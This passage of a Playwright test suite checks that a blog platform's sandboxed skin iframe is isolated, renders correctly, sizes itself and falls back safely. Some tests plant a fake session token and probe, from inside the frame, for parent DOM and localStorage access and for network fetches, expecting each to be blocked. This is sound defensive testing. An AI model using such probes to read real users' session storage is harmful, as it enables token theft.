  console.log("\n[isolate] 격리");

  const ctx = await browser.newContext({ viewport: { width: 900, height: 800 } });
  const page = await ctx.newPage();

  /* 부모 origin 에 Imory 세션처럼 생긴 키를 심어 둔다 */
  await page.goto(PARENT_ORIGIN + HARNESS_PATH, { waitUntil: "load" });
  await page.evaluate(() => {
    localStorage.setItem(
      "sb-vtwcuvouyipohfonfukj-auth-token",
      JSON.stringify({ access_token: "SECRET-SESSION-TOKEN" })
    );
  });

  await page.goto(PARENT_ORIGIN + HARNESS_PATH + ON_QUERY, { waitUntil: "load" });
  await page.waitForFunction(() => window.__sandboxHarnessResult !== undefined,
    null, { timeout: 15000 });

  const frame =
    page.frames().find(f => f.url().startsWith(SANDBOX_ORIGIN));

  check("[isolate] 프레임이 떴다", Boolean(frame));


  const parentDom =
    await frame.evaluate(() => {
      try {
        const n = window.parent.document.body.childElementCount;
        return "READ:" + n;
      } catch (err) {
        return "THREW:" + (err && err.name);
      }
    });

  check("[isolate] ★ 프레임에서 parent DOM 접근이 막힌다",
    parentDom.startsWith("THREW:"),
    parentDom);


  const parentStorage =
    await frame.evaluate(() => {
      try {
        return "READ:" + String(window.parent.localStorage.length);
      } catch (err) {
        return "THREW:" + (err && err.name);
      }
    });

  check("[isolate] ★ 프레임에서 parent localStorage 접근이 막힌다",
    parentStorage.startsWith("THREW:"),
    parentStorage);


  const ownStorage =
    await frame.evaluate(() => {
      const keys = [];
      for (let i = 0; i < localStorage.length; i += 1) {
        keys.push(localStorage.key(i));
      }
      return keys;
    });

  check("[isolate] ★ 프레임 자신의 localStorage 에 Imory 세션이 없다",
    ownStorage.length === 0,
    JSON.stringify(ownStorage));


  const fetchResult =
    await frame.evaluate(async (origin) => {
      try {
        await fetch(origin + "/skin/sandbox/skin-sandbox-config.js");
        return "OK";
      } catch (err) {
        return "THREW:" + (err && err.name);
      }
    }, SANDBOX_ORIGIN);

  check("[isolate] ★ 프레임 안에서 fetch() 가 CSP 로 막힌다",
    fetchResult.startsWith("THREW:"),
    fetchResult);


  const supabaseGlobals =
    await frame.evaluate(() => ({
      supabase: typeof window.supabase,
      client: typeof window.supabaseClient,
      renderSkin: typeof window.renderSkin
    }));

  check("[isolate] ★ 프레임에 supabase 전역이 없다",
    supabaseGlobals.supabase === "undefined" &&
    supabaseGlobals.client === "undefined",
    JSON.stringify(supabaseGlobals));

  await ctx.close();

}


/* =========================================================
   [mobile] 390px
========================================================== */

async function runMobile(browser) {

  console.log("\n[mobile] 390px");

  const { ctx, page } = await openHarness(
    browser, ON_QUERY, { width: 390, height: 780 }
  );

  const overflow =
    await page.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth
    );

  check("[mobile] 부모 문서에 가로 넘침이 없다", overflow <= 0, String(overflow));

  const box =
    await page.locator("iframe.imory-skin-sandbox-frame").boundingBox();

  check("[mobile] iframe 이 390px 를 넘지 않는다",
    Boolean(box) && box.width <= 390, box ? String(box.width) : "(없음)");

  const frame =
    page.frames().find(f => f.url().startsWith(SANDBOX_ORIGIN));

  const frameOverflow =
    await frame.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth
    );

  check("[mobile] 프레임 문서에도 가로 넘침이 없다",
    frameOverflow <= 0, String(frameOverflow));

  await ctx.close();

}


/* =========================================================
   [regress] 메인 origin 의 기존 응답이 그대로인가
========================================================== */

async function runRegress() {

  console.log("\n[regress] 메인 origin 회귀");

  const index = await rawRequestFollow(PARENT_PORT, "/index.html");

  check("[regress] /index.html 이 그대로 200 HTML",
    index.status === 200 &&
    (index.headers["content-type"] || "").includes("text/html"),
    String(index.status));

  const spa = await rawRequestFollow(PARENT_PORT, "/someslug/post/123");

  check("[regress] SPA fallback 경로가 그대로 200 HTML",
    spa.status === 200 &&
    (spa.headers["content-type"] || "").includes("text/html"),
    String(spa.status));

  const render = await rawRequest(PARENT_PORT, "/skin/skin-render.js");

  check("[regress] 기존 스킨 자산이 그대로 200",
    render.status === 200, String(render.status));

  check("[regress] 그 응답에 sandbox CSP 가 붙지 않는다",
    !render.headers["content-security-policy"]);

  const homeCss = await rawRequest(PARENT_PORT, "/home/home-base.css");

  check("[regress] 공개 홈 CSS 도 그대로 200",
    homeCss.status === 200, String(homeCss.status));


  /*
    ★ 실제 서비스 진입 문서들. 호스트 분기가 이것들을 건드리면
    사용자가 로그인도 초대도 관리도 못 한다 — 가장 먼저 깨지는
    자리이므로 경로별로 따로 잰다.
  */

  const entryDocuments = [
    ["메인 홈", "/"],
    ["사용자 홈(slug)", "/someslug"],
    ["사용자 카테고리", "/someslug/category/12"],
    ["관리 화면", "/admin/"],
    ["관리 화면 문서", "/admin/index.html"],
    ["로그인", "/auth/"],
    ["초대", "/invite/"],
    ["Studio", "/studio/"],
    ["Studio Preview 문서", "/studio/preview/preview-frame.html"]
  ];

  for (const [label, pathname] of entryDocuments) {

    /*
      Pages는 `.html` 주소를 308로 확장자 없는 주소에 보낸다.
      사용자가 보는 것은 그 끝의 문서이므로 따라가서 잰다.
    */

    const res = await rawRequestFollow(PARENT_PORT, pathname);

    check(`[regress] ★ ${label} (${pathname}) 이 200 HTML`,
      res.status === 200 &&
      (res.headers["content-type"] || "").includes("text/html"),
      `${res.status} ${res.headers["content-type"] || ""}`);

    check(`[regress] ${label} 응답에 sandbox CSP 가 붙지 않는다`,
      !res.headers["content-security-policy"]);

  }


  /*
    사용자의 실제 구성: IMORY_EXTRA_HOSTS 없이 커스텀 도메인 둘.
    그 구성 그대로 메인이 살아 있는지 본다.
  */

  const withUserEnv =
    await rawRequest(PARENT_PORT, "/", "imory.me");

  check("[regress] ★ Host: imory.me 로 들어와도 200 (프로덕션 Host 그대로)",
    withUserEnv.status === 200, String(withUserEnv.status));

  const frameOnRealMain =
    await rawRequest(PARENT_PORT, "/skin/sandbox/frame.html", "imory.me");

  check("[regress] ★ Host: imory.me 의 frame.html 은 404",
    frameOnRealMain.status === 404, String(frameOnRealMain.status));

  const sandboxRealHost =
    await rawRequest(PARENT_PORT, "/skin/sandbox/frame.html", "skin-frame.imory.me");

  check("[regress] Host: skin-frame.imory.me 는 sandbox 로 분기한다",
    sandboxRealHost.status === 404,
    `${sandboxRealHost.status} — 이 서버의 env 는 localhost:${SANDBOX_PORT} 라 ` +
    `프로덕션 호스트는 unknown 이다(배포에서는 env 가 그 호스트를 가리킨다)`);

}


/* =========================================================
   [env] 배포 환경변수 그대로 — 메인이 죽을 수 있는가

   위 [regress] 는 이 테스트 서버의 env(로컬 포트)로 돈다.
   여기서는 **실제 배포에 들어간 값**과 그 오설정 변형들을
   미들웨어에 직접 먹여, 어떤 경우에도 imory.me 가 살아 있는지 본다.
========================================================== */

async function runEnv() {

  console.log("\n[env] 배포 환경변수 / 오설정");

  const staticHtml = fs.readFileSync(path.join(ROOT, "index.html"));

  const call = async (hostname, pathname, env) =>
    middleware.onRequest({
      request: new Request(`https://${hostname}${pathname}`, { method: "GET" }),
      env,
      next: async () => new Response(staticHtml, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" }
      })
    });

  /* 사용자가 실제로 넣은 값 */
  const DEPLOYED_ENV = {
    SANDBOX_SKIN_HOST: "skin-frame.imory.me",
    SANDBOX_SKIN_PARENT_ORIGINS: "https://imory.me"
  };

  const deployedMain = await call("imory.me", "/", DEPLOYED_ENV);

  check("[env] 배포 env 로 imory.me / 가 200",
    deployedMain.status === 200, String(deployedMain.status));

  const deployedFrameOnMain =
    await call("imory.me", "/skin/sandbox/frame", DEPLOYED_ENV);

  check("[env] 배포 env 로 imory.me 의 frame 문서가 404",
    deployedFrameOnMain.status === 404, String(deployedFrameOnMain.status));

  const deployedFrame =
    await call("skin-frame.imory.me", "/skin/sandbox/frame", DEPLOYED_ENV);

  check("[env] 배포 env 로 skin-frame.imory.me 의 frame 문서가 200 + CSP",
    deployedFrame.status === 200 &&
    Boolean(deployedFrame.headers.get("content-security-policy")),
    String(deployedFrame.status));

  check("[env] 그 CSP 의 frame-ancestors 가 https://imory.me",
    (deployedFrame.headers.get("content-security-policy") || "")
      .includes("frame-ancestors https://imory.me"));

  const deployedSandboxRoot =
    await call("skin-frame.imory.me", "/", DEPLOYED_ENV);

  check("[env] 배포 env 로 skin-frame.imory.me / 가 404",
    deployedSandboxRoot.status === 404, String(deployedSandboxRoot.status));


  /* --- 오설정 변형: 어떤 경우에도 메인은 200 --------------- */

  const badEnvs = [
    ["환경변수 전부 누락", {}],
    ["env 자체가 없음", undefined],
    ["빈 문자열", { SANDBOX_SKIN_HOST: "" }],
    ["공백만", { SANDBOX_SKIN_HOST: "   " }],
    ["오타난 호스트", { SANDBOX_SKIN_HOST: "skinframe.imory.me" }],
    ["★ 메인 호스트를 잘못 넣음", { SANDBOX_SKIN_HOST: "imory.me" }],
    ["★ 대문자 메인 호스트", { SANDBOX_SKIN_HOST: "IMORY.ME" }],
    ["부모 origin 만 누락", { SANDBOX_SKIN_HOST: "skin-frame.imory.me" }]
  ];

  for (const [label, env] of badEnvs) {

    const res = await call("imory.me", "/", env);

    check(`[env] ★ ${label} — imory.me 가 여전히 200`,
      res.status === 200, String(res.status));

  }

  for (const [label, env] of badEnvs) {

    const res = await call("imory.me", "/admin/index.html", env);

    check(`[env] ${label} — /admin/ 도 여전히 200`,
      res.status === 200, String(res.status));

  }

}



/* =========================================================
   SANDBOX-1 — HOME 렌더

   [render]   READY -> ACK -> RENDER_HOME -> RENDERED 왕복과
              그 결과가 native 렌더와 같은 구조인가
   [payload]  실제로 건너간 data 에 금지 필드가 없는가
   [height]   콘텐츠 길이에 iframe 높이가 따라오는가
   [fallback] 폴백 세 경우
   [package]  renderMode 의 Import/Export 왕복
========================================================== */

const RENDER_QUERY =
  ON_QUERY + "&native=1";


/* 프레임 안에 스킨이 실제로 그려질 때까지 */

async function waitForSandboxRender(page) {

  const frame =
    page.frames().find(f => f.url().startsWith(SANDBOX_ORIGIN));

  if (!frame) {
    return null;
  }

  await frame.waitForFunction(
    () => document.getElementById("sandboxFrameRoot")
      .getAttribute("data-imory-sandbox-state") === "rendered",
    null,
    { timeout: 15000 }
  );

  return frame;

}


/*
  비교용 정규화 — 두 화면이 **설계상** 다르게 찍는 것만 지운다.

    · imory-skin-root-i<N>  인스턴스 scope class
      renderSkin() 호출마다 올라가는 번호다. 같은 문서에 두 스킨이
      동시에 떠도 CSS 가 서로 덮지 않게 하는 장치라(skin-render.js),
      두 화면에서 같을 수가 없다.
    · keyframes namespace i<N>-  같은 이유.
    · <style nonce="">  sandbox 프레임의 style 요소만 nonce 를 받는다
      (CSP style-src 가 nonce 만 허용하므로). 브라우저는 nonce 속성의
      **값을 감추므로** 직렬화하면 빈 문자열로 남는다 — 그래서 속성
      자체를 지운다. 실제로 nonce 가 들어갔는지는 아래에서 IDL 값으로
      따로 확인한다.

  이 셋을 빼면 두 화면의 outerHTML 은 **글자 단위로** 같아야 한다.
*/

const NORMALIZE_SKIN_HTML =
  '(html) => html' +
  '.replace(/imory-skin-root-i\\d+/g, "imory-skin-root-iX")' +
  '.replace(/\\bi\\d+-/g, "iX-")' +
  '.replace(/ nonce="[^"]*"/g, "")';


function readSkinRootHtml(selector) {

  return '(() => {' +
    '  const norm = ' + NORMALIZE_SKIN_HTML + ';' +
    '  const root = document.querySelector("' + selector + '");' +
    '  return root ? norm(root.outerHTML) : "";' +
    '})()';

}


async function openRenderHarness(browser, query, viewport) {

  const ctx = await browser.newContext({
    viewport: viewport || { width: 900, height: 900 }
  });

  const page = await ctx.newPage();

  const consoleErrors = [];
  page.on("console", msg => {
    if (msg.type() === "error") consoleErrors.push(msg.text());
  });

  await page.goto(PARENT_ORIGIN + HARNESS_PATH + query, { waitUntil: "load" });

  await page.waitForFunction(
    () => window.__sandboxHarnessResult !== undefined,
    null,
    { timeout: 20000 }
  );

  return { ctx, page, consoleErrors };

}


async function runRender(browser) {

  console.log("\n[render] HOME 렌더 (READY -> ACK -> RENDER_HOME -> RENDERED)");

  const { ctx, page, consoleErrors } =
    await openRenderHarness(browser, RENDER_QUERY);

  check("[render] mount 가 성공했다",
    (await page.evaluate(() => window.__sandboxHarnessResult.ok)) === true,
    await page.evaluate(() => window.__sandboxHarnessResult.reason || ""));

  const frame = await waitForSandboxRender(page);

  check("[render] ★ 프레임이 렌더를 끝냈다 (RENDERED 왕복 성립)", Boolean(frame));

  if (!frame) {
    await ctx.close();
    return null;
  }


  /* --- 공개 데이터가 실제로 그려졌는가 ------------------ */

  const frameText =
    await frame.locator("#sandboxFrameRoot").innerText();

  const expectations = [
    ["블로그 제목", "SANDBOX DEMO"],
    ["프로필 닉네임", "주인장"],
    ["프로필 소개", "작은 소개"],
    ["카테고리 이름", "TXT"],
    ["갤러리 카테고리", "PIC"],
    ["최근 글 제목", "첫 번째 글"],
    ["최근 글 날짜", "2026.09.01"],
    ["발췌 카드", "밑줄 그은 문장 하나"],
    ["발췌 메모", "여기에 메모"],
    ["발췌 원문 위치", "TXT > 2002 > 첫 번째 글"]
  ];

  for (const [label, needle] of expectations) {
    check("[render] ★ HOME 의 " + label + " 이(가) 프레임에 그려졌다",
      frameText.includes(needle), needle);
  }


  /* --- CSS 가 실제로 적용됐는가 -------------------------- */

  const titleSize =
    await frame.evaluate(
      () => getComputedStyle(document.querySelector(".sb-title")).fontSize
    );

  check("[render] ★ 스킨 CSS 가 적용됐다 (동적 style 이 CSP 에 막히지 않았다)",
    titleSize === "22px", titleSize);

  const navBorder =
    await frame.evaluate(
      () => getComputedStyle(
        document.querySelector('.sb-nav-link[data-kind="gallery"]')
      ).borderTopStyle
    );

  check("[render] ★ data-imory-kind 가 CSS 로 이어진다 (재료 일치)",
    navBorder === "dashed", navBorder);

  const cardColor =
    await frame.evaluate(
      () => document.querySelector(".sb-hl-card").style.getPropertyValue("--imory-color")
    );

  check("[render] ★ data-imory-color 가 CSS 변수로 들어갔다 (CSSOM 쓰기는 CSP 대상 아님)",
    cardColor.trim() === "#f6e0c8", cardColor);

  const widthContract =
    await frame.evaluate(
      () => Boolean(document.querySelector('link[href*="content-width.css"]'))
    );

  check("[render] 폭 계약 stylesheet 가 프레임에도 걸린다", widthContract);

  /*
    ★ 스킨 CSS 가 적용된 것이 'unsafe-inline' 덕분이 아니라 **nonce**
    덕분이라는 증거. renderSkin()의 styleNonce 인자가 실제로 그
    요소에 닿았는지 IDL 값으로 본다(속성 값은 브라우저가 감춘다).
  */

  const styleNonce =
    await frame.evaluate(
      () => document.querySelector("#sandboxFrameRoot .imory-skin-root style").nonce || ""
    );

  check("[render] ★ 스킨 style 요소가 프레임의 nonce 를 받았다",
    styleNonce.length > 10, styleNonce ? "(있음)" : "(없음)");

  const nativeStyleNonce =
    await page.evaluate(
      () => document.querySelector("#nativeMount .imory-skin-root style").nonce || ""
    );

  check("[render] ★ native 렌더는 nonce 를 받지 않는다 (기존 호출자 무변경)",
    nativeStyleNonce === "", nativeStyleNonce);


  /* --- native 와 같은 구조인가 --------------------------- */

  const nativeHtml =
    await page.evaluate(readSkinRootHtml("#nativeMount .imory-skin-root"));

  const sandboxHtml =
    await frame.evaluate(readSkinRootHtml("#sandboxFrameRoot .imory-skin-root"));

  check("[render] native 쪽도 같은 스킨을 그렸다", nativeHtml.length > 100);

  check("[render] ★ native 와 sandbox 의 innerHTML 구조가 같다",
    nativeHtml === sandboxHtml,
    nativeHtml === sandboxHtml
      ? ""
      : (() => {
          let i = 0;
          while (i < nativeHtml.length && nativeHtml[i] === sandboxHtml[i]) i += 1;
          return "첫 차이 " + i + "자 부근: native [" +
            nativeHtml.slice(i - 40, i + 40) + "] / sandbox [" +
            sandboxHtml.slice(i - 40, i + 40) + "]";
        })());


  const nativeWidth =
    await page.evaluate(
      () => Math.round(
        document.querySelector("#nativeMount .imory-skin-root").getBoundingClientRect().width
      )
    );

  const sandboxWidth =
    await frame.evaluate(
      () => Math.round(
        document.querySelector("#sandboxFrameRoot .imory-skin-root").getBoundingClientRect().width
      )
    );

  check("[render] ★ 스킨 프레임의 폭이 두 화면에서 같다",
    Math.abs(nativeWidth - sandboxWidth) <= 1,
    "native " + nativeWidth + " / sandbox " + sandboxWidth);


  /* --- 저자 JS 는 실행되지 않는다 ------------------------ */

  check("[render] ★ 스킨이 그린 DOM 에 script 요소가 없다",
    (await frame.evaluate(
      () => document.querySelectorAll("#sandboxFrameRoot script").length
    )) === 0);

  check("[render] CSP 위반 콘솔 오류가 없다",
    !consoleErrors.some(t => /Content Security Policy/i.test(t)),
    consoleErrors.filter(t => /Content Security Policy/i.test(t)).join(" | "));


  /* --- 링크는 이번 라운드에서 비활성 ---------------------- */

  const urlBefore = page.url();

  await frame.locator(".sb-recent-link").first().click();
  await page.waitForTimeout(300);

  check("[render] ★ 프레임 안의 링크는 눌러도 아무 일이 없다 (네비게이션은 SANDBOX-2)",
    page.url() === urlBefore &&
    Boolean(page.frames().find(f => f.url().startsWith(SANDBOX_ORIGIN))),
    page.url());

  return { ctx, page, frame };

}


/* =========================================================
   [payload] 실제로 건너간 data
========================================================== */

async function runPayload(browser) {

  console.log("\n[payload] wire 위의 data");

  const { ctx, page } =
    await openRenderHarness(browser, RENDER_QUERY);

  const frame = await waitForSandboxRender(page);

  if (!frame) {
    check("[payload] 프레임이 렌더를 끝냈다", false);
    await ctx.close();
    return;
  }


  /*
    ★ 프레임 realm 안에서 **실제로 도착한 값**을 읽는다. 부모의
    투영 결과를 믿는 것이 아니라 wire 를 직접 본다.
  */

  const received =
    await frame.evaluate(
      () => JSON.stringify(window.__imorySandboxLastReceived || null)
    );

  check("[payload] 프레임이 data 를 받았다",
    Boolean(received) && received !== "null");

  const receivedKeys =
    await frame.evaluate(
      () => Object.keys(window.__imorySandboxLastReceived || {}).sort().join(",")
    );

  /*
    SANDBOX-2 에서 셋이 늘었다: category / post(그 페이지가 아니면
    null 이지만 키는 언제나 있다 — skin-sandbox-context.js 의
    최상위 키 집합이 고정이어야 "정확히 이 집합인가"를 물을 수
    있다)와 nav(부모가 발급한 navId 표).
  */

  check("[payload] ★ 도착한 최상위 키가 계약 그대로다",
    receivedKeys === [
      "bannerCategory", "banners", "category", "contract", "highlights",
      "home", "images", "memos", "nav", "navigation", "page", "pageType",
      "post", "profile", "site", "viewer"
    ].join(","),
    receivedKeys);


  const forbidden = [
    ["사용자 UUID", "11111111-2222-3333-4444-555555555555"],
    ["access token", "eyJhbGciOi.FAKE.TOKEN"],
    ["refresh token", "FAKE-REFRESH"],
    ["이메일", "owner@example.com"],
    ["비밀글 본문", "비밀글 본문 원문"],
    ["skin row id", "skin-row-id"],
    ["version row id", "version-row-id"],
    ["관리자 링크", "/demo/admin"],
    ["작성 링크", "write=1"]
  ];

  for (const [label, needle] of forbidden) {
    check("[payload] ★ " + label + " 이(가) 프레임에 도착하지 않았다",
      received.indexOf(needle) === -1);
  }

  check("[payload] ★ viewer 는 방문자 값으로 고정돼 있다",
    (await frame.evaluate(
      () => JSON.stringify(window.__imorySandboxLastReceived.viewer)
    )) === JSON.stringify({
      isOwner: false, writeHref: null, adminHref: null, manageHref: null,
      toolsHref: null, highlightHref: null,
      canManageHighlights: false, canManageMemos: false
    }));

  check("[payload] ★ 함수가 하나도 도착하지 않았다",
    (await frame.evaluate(() => {
      const walk = (v, depth) => {
        if (typeof v === "function") return false;
        if (depth > 6 || v === null || typeof v !== "object") return true;
        return Object.values(v).every(x => walk(x, depth + 1));
      };
      return walk(window.__imorySandboxLastReceived, 0);
    })) === true);

  const projectedOnParent =
    await page.evaluate(() => JSON.stringify(window.__sandboxProjected));

  check("[payload] 부모가 고른 것과 프레임에 도착한 것이 같다",
    projectedOnParent === received);

  await ctx.close();

}


/* =========================================================
   [height] 높이와 이중 스크롤
========================================================== */

async function runHeight(browser) {

  console.log("\n[height] 높이 반영 · 이중 스크롤 없음");

  async function measure(query, viewport) {

    const { ctx, page } =
      await openRenderHarness(browser, query, viewport);

    const frame = await waitForSandboxRender(page);

    /* 높이 메시지가 한 바퀴 더 돌 시간 */
    await page.waitForTimeout(400);

    const iframeHeight =
      await page.evaluate(() => {
        const el = document.querySelector("iframe.imory-skin-sandbox-frame");
        return el ? Math.round(el.getBoundingClientRect().height) : 0;
      });

    const contentHeight =
      frame
        ? await frame.evaluate(() => Math.round(
            document.querySelector("#sandboxFrameRoot .imory-skin-root")
              .getBoundingClientRect().height
          ))
        : 0;

    const frameScroll =
      frame
        ? await frame.evaluate(() => ({
            y: document.documentElement.scrollHeight - document.documentElement.clientHeight,
            x: document.documentElement.scrollWidth - document.documentElement.clientWidth
          }))
        : { y: 0, x: 0 };

    return { ctx, page, frame, iframeHeight, contentHeight, frameScroll };

  }


  const short =
    await measure(RENDER_QUERY, { width: 900, height: 900 });

  check("[height] ★ iframe 높이가 콘텐츠 높이를 따라간다 (짧은 글)",
    Math.abs(short.iframeHeight - short.contentHeight) <= 4,
    "iframe " + short.iframeHeight + " / content " + short.contentHeight);

  check("[height] iframe 이 초기 고정값(120px)에 머물지 않는다",
    short.iframeHeight !== 120, String(short.iframeHeight));

  check("[height] ★ 프레임 안에 세로 스크롤이 없다 (이중 스크롤 금지)",
    short.frameScroll.y <= 1, String(short.frameScroll.y));

  await short.ctx.close();


  const tall =
    await measure(RENDER_QUERY + "&tall=1", { width: 900, height: 900 });

  check("[height] ★ 콘텐츠가 길어지면 iframe 도 함께 길어진다",
    tall.iframeHeight > 1500 &&
    Math.abs(tall.iframeHeight - tall.contentHeight) <= 4,
    "iframe " + tall.iframeHeight + " / content " + tall.contentHeight);

  check("[height] 긴 콘텐츠에서도 프레임 안에 세로 스크롤이 없다",
    tall.frameScroll.y <= 1, String(tall.frameScroll.y));

  check("[height] 긴 콘텐츠에서도 가로 넘침이 없다",
    tall.frameScroll.x <= 0, String(tall.frameScroll.x));


  /*
    ★ 무한 높이 루프가 없는가 — 잠깐 기다린 뒤 값이 더 이상
    움직이지 않아야 한다. 진동하면 여기서 다른 값이 나온다.
  */

  const settled1 =
    await tall.page.evaluate(() =>
      document.querySelector("iframe.imory-skin-sandbox-frame").style.height);

  await tall.page.waitForTimeout(700);

  const settled2 =
    await tall.page.evaluate(() =>
      document.querySelector("iframe.imory-skin-sandbox-frame").style.height);

  check("[height] ★ 높이가 진동하지 않고 한 값에 멈춘다",
    settled1 === settled2, settled1 + " -> " + settled2);

  await tall.ctx.close();


  const mobile =
    await measure(RENDER_QUERY, { width: 390, height: 780 });

  check("[height] 390px 에서도 높이가 맞는다",
    Math.abs(mobile.iframeHeight - mobile.contentHeight) <= 4,
    "iframe " + mobile.iframeHeight + " / content " + mobile.contentHeight);

  check("[height] ★ 390px 에서 프레임 가로 넘침 0",
    mobile.frameScroll.x <= 0, String(mobile.frameScroll.x));

  const parentOverflow =
    await mobile.page.evaluate(() =>
      document.documentElement.scrollWidth - document.documentElement.clientWidth);

  check("[height] ★ 390px 에서 부모 가로 넘침 0",
    parentOverflow <= 0, String(parentOverflow));

  await mobile.ctx.close();

}


/* =========================================================
   [fallback] 폴백
========================================================== */

async function runFallback(browser) {

  console.log("\n[fallback] 폴백 경로");


  /* --- renderMode 가 없으면 sandbox 경로를 타지 않는다 --- */

  {
    const { ctx, page } =
      await openRenderHarness(browser, RENDER_QUERY + "&renderMode=native");

    check("[fallback] ★ renderMode 가 없으면 native 로 판정된다",
      (await page.evaluate(() => window.__sandboxHarnessResult.reason)) === "not-sandbox");

    check("[fallback] ★ 그때 문서에 iframe 이 하나도 없다",
      (await page.locator("iframe").count()) === 0);

    check("[fallback] 그래도 native 렌더는 그대로 나온다",
      (await page.locator("#nativeMount .imory-skin-root").count()) === 1);

    await ctx.close();
  }


  /* --- frame origin 이 없으면 --- */

  {
    const { ctx, page } =
      await openRenderHarness(browser, "?sandboxSkin=1&native=1");

    check("[fallback] ★ frame origin 이 없으면 iframe 을 만들지 않는다",
      (await page.evaluate(() => window.__sandboxHarnessResult.reason)) === "no-origin" &&
      (await page.locator("iframe").count()) === 0);

    await ctx.close();
  }


  /* --- READY 가 오지 않으면 (프레임 문서를 끊는다) --- */

  {
    const ctx = await browser.newContext({ viewport: { width: 900, height: 900 } });
    const page = await ctx.newPage();

    /*
      프레임 문서만 끊는다. origin 은 살아 있고 iframe 도 만들어지지만
      READY 가 영영 오지 않는다 — 부모가 timeout 으로 폴백해야 한다.
    */

    await page.route(
      SANDBOX_ORIGIN + "/skin/sandbox/frame*",
      route => route.abort()
    );

    await page.goto(PARENT_ORIGIN + HARNESS_PATH + RENDER_QUERY, { waitUntil: "load" });

    await page.waitForFunction(
      () => window.__sandboxHarnessResult !== undefined,
      null,
      { timeout: 30000 }
    );

    check("[fallback] ★ READY 가 안 오면 timeout 으로 끝난다",
      (await page.evaluate(() => window.__sandboxHarnessResult.reason)) === "timeout",
      await page.evaluate(() => window.__sandboxHarnessResult.reason));

    check("[fallback] ★ 그때 만들었던 iframe 을 치운다 (백지를 남기지 않는다)",
      (await page.locator("iframe.imory-skin-sandbox-frame").count()) === 0);

    check("[fallback] 다시 시도하지 않는다 (iframe 총 0개)",
      (await page.locator("iframe").count()) === 0);

    await ctx.close();
  }

}


/* =========================================================
   [package] renderMode 의 Import / Export 왕복

   실제 skin/skin-package-import.js · skin-package-export.js 를
   브라우저에서 돌린다(둘 다 classic script + DOM sanitizer 의존).
========================================================== */

async function runPackage(browser) {

  console.log("\n[package] renderMode Import/Export 왕복");

  const ctx = await browser.newContext();
  const page = await ctx.newPage();

  await page.goto(
    PARENT_ORIGIN + "/skin/sandbox/skin-sandbox-package-test.html",
    { waitUntil: "load" }
  );

  await page.waitForFunction(
    () => window.__packageRoundtripResult !== undefined,
    null,
    { timeout: 20000 }
  );

  const r =
    await page.evaluate(() => window.__packageRoundtripResult);

  check("[package] fixture 스킨이 Import 를 통과한다",
    Boolean(r.imported) && r.imported.ok === true,
    r.imported ? (r.imported.message || "") : "(없음)");

  check("[package] ★ Import 결과에 renderMode 가 살아 있다",
    Boolean(r.imported) && r.imported.renderMode === "sandbox",
    r.imported ? String(r.imported.renderMode) : "");

  check("[package] ★ Export 가 renderMode 를 파일에 싣는다",
    Boolean(r.exported) && r.exported.renderMode === "sandbox",
    r.exported ? String(r.exported.renderMode) : "");

  check("[package] ★ Import -> Export -> Import 왕복에서 값이 그대로다",
    Boolean(r.reimported) && r.reimported.ok === true &&
    r.reimported.renderMode === "sandbox",
    r.reimported ? String(r.reimported.renderMode) : "");

  check("[package] ★ 왕복 뒤에도 templates 와 css 가 같다",
    r.roundtripSame === true, r.roundtripDiff || "");

  check("[package] renderMode 가 없는 스킨은 결과에도 키가 없다",
    Boolean(r.nativeImport) && r.nativeImport.ok === true &&
    r.nativeImport.hasRenderModeKey === false);

  check("[package] renderMode:'native' 를 적은 파일은 그 값이 보존된다",
    Boolean(r.explicitNative) && r.explicitNative.ok === true &&
    r.explicitNative.renderMode === "native");

  check('[package] ★ 모르는 renderMode 는 reason:"render-mode" 로 거부된다',
    Boolean(r.weird) && r.weird.ok === false && r.weird.reason === "render-mode",
    r.weird ? r.weird.ok + " / " + r.weird.reason : "");

  check("[package] ★ 문자열이 아닌 renderMode 도 거부된다",
    Array.isArray(r.nonString) &&
    r.nonString.length > 0 &&
    r.nonString.every(x => x.ok === false && x.reason === "render-mode"),
    JSON.stringify(r.nonString));

  check("[package] ★ 모르는 renderMode 는 Export 에도 실리지 않는다",
    r.weirdExportHasKey === false);


  /* --- SANDBOX-5A — 작성 JS 도 왕복에서 사라지지 않는다 --- */

  check("[package] ★ js 가 Import -> Export -> Import 왕복에서 그대로다",
    Boolean(r.js) && r.js.importOk === true &&
    r.js.value === "window.__x = 1;" &&
    r.js.exported === "window.__x = 1;" &&
    r.js.reimported === "window.__x = 1;",
    JSON.stringify(r.js));

  check("[package] ★ 빈 js 도 값이다 (통과하고 보존된다)",
    Boolean(r.jsEmpty) && r.jsEmpty.ok === true &&
    r.jsEmpty.hasKey === true && r.jsEmpty.value === "",
    JSON.stringify(r.jsEmpty));

  check("[package] js 가 없는 스킨은 결과에도 키가 없다",
    Boolean(r.jsAbsent) && r.jsAbsent.ok === true &&
    r.jsAbsent.hasKey === false,
    JSON.stringify(r.jsAbsent));

  check('[package] ★ 문자열이 아니거나 너무 긴 js 는 reason:"author-js" 로 거부된다',
    Array.isArray(r.jsBad) && r.jsBad.length === 5 &&
    r.jsBad.every((x) => x.ok === false && x.reason === "author-js"),
    JSON.stringify(r.jsBad));

  check("[package] ★ 이상한 js 는 Export 에도 실리지 않는다",
    r.jsWeirdExportHasKey === false);

  await ctx.close();

}



/* =========================================================
   [home] 공개 HOME 경로 — 하네스가 아니라 **진짜 index.html**

   위 [render] 절은 host 모듈을 직접 불러 확인한다. 이 절은 그
   위층, 즉 실제 공개 진입점이 sandbox 경로로 이어지는지를 본다:

     index.html initHomeRenderer()
       -> tryRenderPublishedSkinHome(ownerId)
       -> skin/skin-home.js renderPublishedSkinHome()
            get_published_skin RPC -> resolveSkinTemplate
            -> buildSkinContext -> resolveSkinRenderMode
            -> mountSandboxSkin()

   Supabase 응답만 mock 하고 HTML/CSS/JS 는 저장소의 실제 파일을
   그대로 쓴다(다른 skin e2e 와 같은 방식).
========================================================== */

const HOME_SLUG = "testuser";
const HOME_OWNER_ID = "11111111-2222-3333-4444-555555555555";
const SUPABASE_HOST = "vtwcuvouyipohfonfukj.supabase.co";

const HOME_DB = {
  profiles: [{
    user_id: HOME_OWNER_ID, slug: HOME_SLUG, home_mode: "customize",
    nickname: "주인장", bio: "작은 소개"
  }],
  site_settings: [
    { user_id: HOME_OWNER_ID, key: "blog_title", value: "SANDBOX DEMO" },
    { user_id: HOME_OWNER_ID, key: "favicon_url", value: "" }
  ],
  categories: [
